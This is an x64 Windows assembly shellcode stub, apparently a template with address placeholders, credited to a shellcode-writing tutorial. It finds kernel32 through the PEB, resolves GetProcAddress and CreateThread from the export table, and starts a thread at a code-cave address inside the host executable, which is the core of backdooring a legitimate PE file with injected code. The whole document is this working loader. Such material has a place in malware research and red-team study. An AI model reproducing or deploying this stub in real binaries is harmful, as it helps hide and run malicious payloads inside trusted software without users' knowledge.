; calculate image base
lea r15, [rip]
sub r15, :FIRST_INSTR_ADDR:
sub r15, 7               ; len(asm('lea r15, [rip]')) = 7
                         ; R15 = IMAGE_BASE

; based on https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/

xor rcx, rcx             ; RCX = 0
mov rax, [gs:0x60]       ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi, [rax + 0x20]    ; RSI = PEB->Ldr.InMemOrder
lodsq                    ; RAX = Second module
xchg rax, rsi            ; RAX = RSI, RSI = RAX
lodsq                    ; RAX = Third(kernel32)
mov rbx, [rax + 0x20]    ; RBX = Base address

; Parse kernel32 PE

xor r8, r8                 ; Clear r8
mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
mov rdx, r8                ; RDX = DOS->e_lfanew
add rdx, rbx               ; RDX = PE Header
mov r8d, [rdx + 0x88]      ; R8D = Offset export table
add r8, rbx                ; R8 = Export table
xor rsi, rsi               ; Clear RSI
mov esi, [r8 + 0x20]       ; RSI = Offset namestable
add rsi, rbx               ; RSI = Names table
xor rcx, rcx               ; RCX = 0
mov r9, 0x41636f7250746547 ; GetProcA

; Loop through exported functions and find GetProcAddress

Get_Function:

inc rcx                    ; Increment the ordinal
xor rax, rax               ; RAX = 0
mov eax, [rsi + rcx * 4]   ; Get name offset
add rax, rbx               ; Get function name
cmp [rax], r9              ; GetProcA ?
jnz Get_Function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
add rsi, rbx               ; RSI = Ordinals table
mov cx, [rsi + rcx * 2]    ; Number of function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x1c]       ; Offset address table
add rsi, rbx               ; ESI = Address table
xor rdx, rdx               ; RDX = 0
mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
add rdx, rbx               ; RDX = GetProcAddress
mov rdi, rdx               ; Save GetProcAddress in RDI

; Use GetProcAddress to find the address of LoadLibrary

mov rcx, 0x64616572          ; 'read'
push rcx                     ; Push on the stack
mov rcx, 0x6854657461657243  ; 'CreateTh'
push rcx                     ; Push on stack
mov rdx, rsp                 ; CreateThread
mov rcx, rbx                 ; kernel32.dll base address
sub rsp, 0x30                ; Allocate stack space for function call
call rdi                     ; Call GetProcAddress
add rsp, 0x40                ; Cleanup allocated stack space (CreateThread + allocated 0x30)
mov rsi, rax                 ; CreateThread saved in RSI

; Call CreateThread
; CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
;                                    RCX                        RDX                                 R8                     R9                 STACK          ,         STACK

push 0                        ; lpThreadId
push 0                        ; dwCreationFlags
mov r9, 0                     ; lpParameter
mov r8, :CODE_CAVE_ADDR:      ; lpStartAddress -> set to rva of code cave beginning
add r8, r15                   ; add IMAGE_BASE to rva
mov rdx, 0                    ; dwStackSize
mov rcx, 0                    ; lpThreadAttributes

sub rsp, 0x30                 ; Allocate stack space for function call
call rsi                      ; Call CreateThread
add rsp, 0x40                 ; Cleanup allocated stack space (+ space for lpThreadId and dwCreationFlags args)